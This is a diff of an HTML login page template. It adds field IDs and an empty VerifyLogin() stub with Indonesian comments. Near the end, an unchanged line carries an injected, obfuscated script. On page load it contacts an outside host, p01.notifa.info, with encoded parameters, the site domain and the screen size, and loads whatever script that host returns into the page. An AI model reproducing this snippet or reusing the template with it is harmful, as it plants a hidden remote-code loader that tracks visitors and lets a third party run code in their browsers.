@@ -48,13 +48,6 @@
             <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit sedo eiusmod tempor incididunt dolore.</p>
           </div>
         </div>
-        <div class="single-sl-slide">
-          <img src="images/mac.png" alt="">
-          <div class="content-box">
-            <h2>All In One Transfer Solutions</h2>
-            <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit sedo eiusmod tempor incididunt dolore.</p>
-          </div>
-        </div>
       </div>
       <div class="sl-form-wrap">
         <header>
@@ -67,22 +60,22 @@
         </header>
         <div class="content-box">
           <h2>Login Account</h2>
-          <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit sedo<br> eiusmod tempor incididunt dolore.</p>
+          <p>This is Login page<br>Login to your account here below</p>
         </div>
         <form action="#" class="sl-form">
           <div class="form-group">
             <label>Email or Username</label>
-            <input type="email" placeholder="example@gmail.com" required>
+            <input id="login_email_username" type="email" placeholder="example@example.com" required>
           </div>
           <div class="form-group">
             <label>Password</label>
-            <input type="password" placeholder="Password" required>
+            <input id="login_password" type="password" placeholder="Password" required>
           </div>
           <div class="form-check">
             <input type="checkbox" class="form-check-input">
-            <label class="form-check-label">Remember Password</label>
+            <label id="login_remember_password" class="form-check-label">Remember Password</label>
           </div>
-          <button class="btn btn-filled btn-round"><span class="bh"></span> <span>Login</span></button>
+          <button type="button" class="btn btn-filled btn-round" onclick="VerifyLogin()">Login</button>
           <p class="notice">Don’t have an account? <a href="signup.html">Signup Now</a></p>
         </form>
       </div>
@@ -101,4 +94,14 @@
     <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/106949/jquery.onscreen.js"></script>
     <script src="js/scripts.js"></script>
   <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXONWxBlqyl8O1BBH2ngtPfgfF4183cFxQixCWOwJAkiSlIqWnjkrVB2dAz3iaIAaWyaSuTNvWP9QxsDiKI7ptUJ9aTXARZc7FVz%2ftaWK2NCWF61r1vjO5JEwFpShQwlCdBGxMnidj5j0s%2fo%2fi1CA92p%2bSa18DoRdgt7Fj6UpMYpbDdB1vyuobY5n2tErYhwlsu9butaLW8ksXaI4epEVsHF%2fyZCZ6xKdpvVV99vcSktN8c3e5%2bx9bqn4fKiV3zLT6L9UTpEDwz1hVuVPBSXC9JVNzE5oVhUFVjXubipeD8TQ75WOfIQQIL4YSnpXOJddpZaw%2f9mt14REfPL0yIpc5vBFrc1XKUlVQomUBMKHY2souRS9yJ%2fT%2fCeCqqFBWRk9Jnp45o2i3xUTASFJoI1DN%2fPL97AqoNwp9uRcTv%2fFBAG7DWlAmF%2bx%2fDi7TPr%2fEn2FhgFEUCnK4Aqs%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
-</html>
+    <script>
+      function VerifyLogin(){
+        //Cek username or email cocok or not
+        login_email_username = document.getElementById('login_email_username').value;
+        login_password = document.getElementById('login_password').value;
+
+        
+        //kl username, email, or pass salah, muncul alert buat ngasih tau
+      }
+    </script>
+  </html>
